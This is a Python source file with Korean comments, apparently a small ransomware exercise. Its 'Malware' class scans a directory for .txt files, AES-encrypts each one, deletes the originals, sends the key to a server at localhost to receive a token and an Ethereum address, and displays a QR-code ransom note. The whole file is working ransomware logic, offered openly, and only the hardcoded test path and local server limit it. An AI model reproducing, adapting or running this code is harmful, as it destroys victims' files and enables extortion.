import qrcode
import time
import os
import json
import requests

from Crypto.Cipher import AES

class AESCipher:
    # key = 암호화에서 사용하는 key (16, 32, 64 ... bytes)
    def __init__(self, key):
        self.key = key
        self.BS = 16
        self.pad =lambda s: s + (self.BS - len(s) % self.BS) * chr(self.BS - len(s) % self.BS).encode()
        self.unpad = lambda s: s[:-ord(s[len(s) - 1:])]

    # 누가봐도 암호화
    # raw = 평문 데이터
    def encrypt(self, raw):
        raw = self.pad(raw.encode())
        iv = os.urandom(16)
        cipher = AES.new(self.key.encode(), AES.MODE_CBC , iv)
        return (iv + cipher.encrypt(raw)).hex()

    # 누가봐도 복호화
    # enc = 암호화된 데이터
    def decrypt(self, enc):
        enc = bytes.fromhex(enc)
        iv = enc[:16]
        enc = enc[16:]
        cipher = AES.new(self.key.encode(), AES.MODE_CBC , iv)
        return self.unpad(cipher.decrypt(enc).decode())

class Malware:
    # path = 암호화할 파일 경로
    def __init__(self, path="./test"):
        self._path = path
        self._files = []
        self._token = None
        self._address = None

    # 파일 시스템을 스캔
    # self._files = 암호화할 파일 리스트
    # .txt 파일만 필터링
    # return 값은 파일 개수
    def scan(self):
        for root, dirs, files in os.walk(self._path):
            for filename in files :
                filepath = os.path.join(root, filename)
                if filename.endswith(".txt"):
                    self._files.append(filepath)
        # print("Scanned files: ", self._files)
        return len(self._files)

    # 암호화
    # 암호화한 파일의 확장자는 {원본파일명}.{enc}
    def encrypt(self, key):
        aes = AESCipher(key)
        for filepath in self._files:
            data = open(filepath, "r").read()
            enc = aes.encrypt(data)

            f = open(filepath + ".enc", "w")
            f.write(enc)
            f.close()

            os.remove(filepath)
        

    # QRCode 생성, 전시
    def leave_ransom_note(self, address):
        qr = qrcode.QRCode(
            version = 1,
            error_correction = qrcode.constants.ERROR_CORRECT_L,
            box_size = 10,
            border = 4
        )
        qr.add_data(address)
        qr.make(fit=True)
        img=qr.make_image(fill_color="black", back_color="white")
        img.save("rickRolled.png")
        
        # my linux
        os.system("firefox-developer-edition ./rickRolled.png")
        
        # for mac
        # os.system("open ./README.png")
        # for windows 
        # os.system("C:/Program Files/Internet Explorer/iexplore.exe README.png")


    # 서버로 key 전송, token을 반환받아 저장한다.
    def save_key(self, key):
        res = requests.get("http://127.0.0.1:5000/save_token?key="+key).json()
        
        self._ethereum = res.get("etheremum_address", "")
        token_file = open("token.txt", "w")
        token_file.write(str(res.get("token", "")))
        token_file.close()
        

    # 실행
    def run(self):
        # Scan the file system
        num_files = self.scan()
        if num_files == 0:
            return
        # Generate a random key
        key = os.urandom(16).hex() # 32 bytes
        # Encrypt the files
        self.encrypt(key)
        self.save_key(key)
        self.leave_ransom_note(self._ethereum)
        

if __name__ == '__main__':
    malware = Malware()
    malware.run()
